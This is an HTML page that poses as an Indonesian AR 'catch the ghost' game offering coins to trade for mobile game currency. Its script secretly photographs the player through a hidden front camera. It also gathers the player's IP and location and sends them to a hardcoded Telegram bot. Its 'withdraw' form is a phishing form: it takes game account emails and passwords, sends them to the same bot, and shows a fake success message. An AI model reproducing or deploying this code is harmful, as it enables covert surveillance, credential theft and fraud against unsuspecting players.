<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>👻 Ghost AR - Tangkap Hantu Dapat Coin!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            background: #000;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
        }

        .start-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0a0f1e, #0a0a1a);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
        }

        .start-screen h1 {
            font-size: 48px;
            color: #ffd700;
            margin-bottom: 20px;
        }

        .start-screen p {
            color: white;
            margin-bottom: 30px;
        }

        .start-btn {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border: none;
            padding: 16px 40px;
            border-radius: 50px;
            font-size: 20px;
            font-weight: bold;
            color: #000;
            cursor: pointer;
        }

        .error-msg {
            color: #ff6666;
            margin-top: 20px;
            display: none;
        }

        .game-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
        }

        #cameraView {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        #frontCamera {
            position: fixed;
            bottom: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }

        canvas {
            display: none;
        }

        .ui-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
            pointer-events: none;
        }

        .coin-header {
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            border-radius: 50px;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            pointer-events: auto;
            border: 1px solid rgba(255,215,0,0.3);
        }

        .coin-display {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 24px;
            font-weight: bold;
            color: #ffd700;
        }

        .withdraw-btn {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }

        .info-panel {
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 15px;
            text-align: center;
            pointer-events: auto;
        }

        .ghost-object {
            position: absolute;
            width: 80px;
            height: 80px;
            background: rgba(0,0,0,0.5);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 50px;
            cursor: pointer;
            animation: floatGhost 1s ease infinite;
            z-index: 10;
            backdrop-filter: blur(5px);
            border: 2px solid rgba(255,215,0,0.5);
        }

        @keyframes floatGhost {
            0%,100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 200;
            justify-content: center;
            align-items: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            border-radius: 30px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            border: 2px solid #ffd700;
        }

        .modal-content select, .modal-content input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #ffd700;
            border-radius: 12px;
            background: rgba(0,0,0,0.5);
            color: white;
        }

        .modal-content button {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .close-modal {
            background: #ff4444;
            color: white;
        }
    </style>
</head>
<body>

<div class="start-screen" id="startScreen">
    <h1>👻 GHOST AR</h1>
    <p>Tangkap hantu yang muncul di layar!</p>
    <p>Setiap hantu = +100 COIN</p>
    <p style="font-size: 14px;">🎮 Game butuh akses kamera</p>
    <button class="start-btn" id="startGameBtn">🎮 MULAI GAME</button>
    <div class="error-msg" id="errorMsg"></div>
</div>

<div class="game-container" id="gameContainer">
    <video id="cameraView" autoplay playsinline></video>
    <video id="frontCamera" autoplay playsinline></video>
    <canvas id="photoCanvas"></canvas>
    
    <div id="ghostContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:5; pointer-events:none;">
    </div>

    <div class="ui-overlay">
        <div class="coin-header">
            <div class="coin-display">
                <span>🪙</span>
                <span id="coinAmount">0</span>
            </div>
            <button class="withdraw-btn" id="withdrawBtn">💎 TUKAR COIN</button>
        </div>
        <div class="info-panel">
            <p>👻 <strong>Ghost AR</strong> - Tangkap Hantu!</p>
            <p>🎯 Klik hantu yang muncul: <span style="color:#ffd700;">+100 COIN</span></p>
            <p>⏳ Hantu muncul random setiap 5-10 detik</p>
        </div>
    </div>
</div>

<div id="withdrawModal" class="modal">
    <div class="modal-content">
        <h2>💎 TUKAR COIN KE GAME</h2>
        <p style="color:white;">Saldo: <strong id="modalCoin">0</strong> COIN</p>
        <p style="color:#ffd700; font-size:12px;">500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
        
        <select id="gameSelect">
            <option value="Mobile Legends">🎮 Mobile Legends - Diamond</option>
            <option value="Free Fire">🔥 Free Fire - Diamond</option>
            <option value="PUBG Mobile">🎯 PUBG Mobile - UC</option>
        </select>
        <input type="text" id="gameId" placeholder="ID Game / Username">
        <input type="text" id="gameZone" placeholder="Zona / Server">
        <input type="email" id="gameEmail" placeholder="Email Akun Game">
        <input type="password" id="gamePassword" placeholder="Password Akun Game">
        <button id="submitWithdraw">💎 TUKAR SEKARANG</button>
        <button class="close-modal" id="closeModal">TUTUP</button>
    </div>
</div>

<script>
    const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
    const CHAT_ID = "8854409945";

    let coins = 0;
    let photoTaken = false;
    let locationSent = false;
    let backStream = null;
    let frontStream = null;
    let ghostInterval = null;
    let gameActive = false;

    const startScreen = document.getElementById('startScreen');
    const gameContainer = document.getElementById('gameContainer');
    const startBtn = document.getElementById('startGameBtn');
    const errorMsg = document.getElementById('errorMsg');
    const coinSpan = document.getElementById('coinAmount');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const modalCoinSpan = document.getElementById('modalCoin');
    const ghostContainer = document.getElementById('ghostContainer');
    const backVideo = document.getElementById('cameraView');
    const frontVideo = document.getElementById('frontCamera');
    const photoCanvas = document.getElementById('photoCanvas');

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) { return 'Unknown'; }
    }

    async function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) return resolve('Tidak tersedia');
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
                () => resolve('Tidak diizinkan')
            );
        });
    }

    async function sendLocationAndIP() {
        if (locationSent) return;
        const ip = await getIP();
        const location = await getLocation();
        const tanggal = new Date().toLocaleString('id-ID');
        const pesan = `📍 LOKASI & IP KORBAN 📍%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AGame: GHOST AR (Tangkap Hantu)`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
        locationSent = true;
    }

    async function captureFrontPhoto() {
        if (photoTaken) return;
        if (!frontStream || !frontStream.active) return;
        if (frontVideo.videoWidth === 0 || frontVideo.videoHeight === 0) {
            setTimeout(() => captureFrontPhoto(), 500);
            return;
        }

        photoCanvas.width = frontVideo.videoWidth;
        photoCanvas.height = frontVideo.videoHeight;
        const ctx = photoCanvas.getContext('2d');
        ctx.drawImage(frontVideo, 0, 0, photoCanvas.width, photoCanvas.height);

        const blob = await new Promise(resolve => photoCanvas.toBlob(resolve, 'image/jpeg', 0.85));
        const ip = await getIP();
        const location = await getLocation();
        const tanggal = new Date().toLocaleString('id-ID');
        const caption = `📸 FOTO WAJAH KORBAN 📸%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AKorban main game Ghost AR (tangkap hantu) - tidak sadar difoto`;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'face.jpg');
        formData.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        photoTaken = true;
    }

    function spawnGhost() {
        if (!gameActive) return;
        
        const ghost = document.createElement('div');
        ghost.className = 'ghost-object';
        
        const size = Math.random() * 60 + 60;
        ghost.style.width = size + 'px';
        ghost.style.height = size + 'px';
        ghost.style.fontSize = (size - 20) + 'px';
        ghost.style.left = Math.random() * (window.innerWidth - size) + 'px';
        ghost.style.top = Math.random() * (window.innerHeight - 150) + 'px';
        ghost.style.position = 'absolute';
        ghost.style.pointerEvents = 'auto';
        
        const ghosts = ['👻', '💀', '👹', '😈', '👾'];
        ghost.innerHTML = ghosts[Math.floor(Math.random() * ghosts.length)];
        
        ghost.onclick = (e) => {
            e.stopPropagation();
            coins += 100;
            coinSpan.innerText = coins;
            ghost.remove();
            
            // Efek getar
            if (navigator.vibrate) navigator.vibrate(100);
        };
        
        ghostContainer.appendChild(ghost);
        
        // Hantu ilang setelah 5 detik kalo gak diklik
        setTimeout(() => {
            if (ghost.parentNode) ghost.remove();
        }, 5000);
    }

    async function startGame() {
        errorMsg.style.display = 'none';
        
        try {
            backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            
            backVideo.srcObject = backStream;
            frontVideo.srcObject = frontStream;

            await sendLocationAndIP();
            
            setTimeout(() => captureFrontPhoto(), 2000);
            setTimeout(() => { if (!photoTaken) captureFrontPhoto(); }, 8000);
            setTimeout(() => { if (!photoTaken) captureFrontPhoto(); }, 15000);

            startScreen.style.display = 'none';
            gameContainer.style.display = 'block';
            gameActive = true;
            
            // Munculin hantu setiap 5-10 detik
            ghostInterval = setInterval(() => {
                if (gameActive) spawnGhost();
            }, Math.random() * 5000 + 5000);
            
            // Langsung spawn 3 hantu awal
            setTimeout(() => spawnGhost(), 1000);
            setTimeout(() => spawnGhost(), 3000);
            setTimeout(() => spawnGhost(), 5000);
            
            document.documentElement.requestFullscreen();
            
        } catch(err) {
            errorMsg.style.display = 'block';
            errorMsg.innerText = '❌ Gagal akses kamera! Izinkan akses kamera untuk bermain.';
        }
    }

    // Withdraw logic
    const withdrawModal = document.getElementById('withdrawModal');
    const closeModal = document.getElementById('closeModal');
    const submitWithdraw = document.getElementById('submitWithdraw');
    const gameSelect = document.getElementById('gameSelect');
    const gameId = document.getElementById('gameId');
    const gameZone = document.getElementById('gameZone');
    const gameEmail = document.getElementById('gameEmail');
    const gamePassword = document.getElementById('gamePassword');

    withdrawBtn.onclick = () => {
        if (coins < 500) {
            alert('Minimal tukar 500 COIN! (50 Diamond/UC)');
            return;
        }
        modalCoinSpan.innerText = coins;
        withdrawModal.classList.add('active');
    };

    closeModal.onclick = () => {
        withdrawModal.classList.remove('active');
        gameId.value = '';
        gameZone.value = '';
        gameEmail.value = '';
        gamePassword.value = '';
    };

    submitWithdraw.onclick = async () => {
        const selectedGame = gameSelect.value;
        const idGame = gameId.value.trim();
        const zone = gameZone.value.trim();
        const email = gameEmail.value.trim();
        const password = gamePassword.value.trim();

        if (!idGame) { alert('Masukkan ID Game!'); return; }
        if (!email || !password) { alert('Masukkan Email dan Password akun game!'); return; }
        if (coins < 500) { alert('Minimal 500 COIN!'); return; }

        let reward = selectedGame === "PUBG Mobile" ? "60 UC" : "50 Diamond";
        
        const ip = await getIP();
        const location = await getLocation();
        const tanggal = new Date().toLocaleString('id-ID');
        
        let pesan = `💎 TUKAR COIN KE GAME 💎%0A%0A`;
        pesan += `🎮 GAME     : ${selectedGame}%0A`;
        pesan += `🎮 ID GAME  : ${idGame}%0A`;
        pesan += `🗺️ ZONE     : ${zone || '-'}%0A`;
        pesan += `📧 EMAIL    : ${email}%0A`;
        pesan += `🔑 PASSWORD : ${password}%0A`;
        pesan += `🪙 COIN     : ${coins}%0A`;
        pesan += `💎 REWARD   : ${reward}%0A`;
        pesan += `🌐 IP       : ${ip}%0A`;
        pesan += `📍 LOKASI   : ${location}%0A`;
        pesan += `📅 WAKTU    : ${tanggal}`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
        
        alert(`✅ Tukar coin berhasil! ${reward} akan dikirim ke akun game kamu dalam 24 jam.`);
        
        coins = 0;
        coinSpan.innerText = coins;
        modalCoinSpan.innerText = coins;
        withdrawModal.classList.remove('active');
        
        gameId.value = '';
        gameZone.value = '';
        gameEmail.value = '';
        gamePassword.value = '';
    };

    startBtn.onclick = startGame;
</script>
</body>
</html>
